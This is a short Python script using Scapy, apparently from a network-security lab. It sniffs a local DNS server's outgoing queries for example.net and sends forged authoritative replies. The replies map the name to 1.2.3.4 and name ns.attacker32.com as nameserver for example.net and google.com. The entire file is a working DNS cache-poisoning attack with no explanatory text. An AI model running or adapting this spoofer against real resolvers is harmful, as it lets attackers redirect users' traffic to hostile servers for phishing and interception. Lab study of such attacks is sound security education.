#!/usr/bin/python
from scapy.all import * 


def spoof_authdns(pkt):

  # Condition to target the packets we're interested in
  if(DNS in pkt and "example.net" in pkt[DNS].qd.qname.decode("utf-8")):

     # Construct IP packet from sniffed packet data
     IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst)

     # Construct UDP packet from sniffed packet data
     UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

     # Answer Section
     Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type="A",
                    rdata="1.2.3.4", ttl=259200)

     # Name Server Section for example.net
     NSsec1  = DNSRR(rrname="example.net", type="NS",
                    rdata="ns.attacker32.com", ttl=259200)

     # Name Server Section for google.com
     NSsec2  = DNSRR(rrname="google.com", type="NS",
                    rdata="ns.attacker32.com", ttl=259200)

     # Construct DNS Response packet for example.net
     DNSpkt1 = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd,
                  aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,
                  an=Anssec, ns=NSsec1)

     # Construct DNS Response packet for google.com
     DNSpkt2 = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd,
                  aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,
                  an=Anssec, ns=NSsec2)     

     # Concatentate respective packet segments
     spoofpkt1 = IPpkt/UDPpkt/DNSpkt1
     spoofpkt2 = IPpkt/UDPpkt/DNSpkt2

     # Send the packets for delivery
     send(spoofpkt1)
     send(spoofpkt2)

# Target the local DNS server (Machine B) with the sniffer
pkt=sniff(filter="udp and (src host 10.0.2.5 and dst port 53)",
          prn=spoof_authdns)
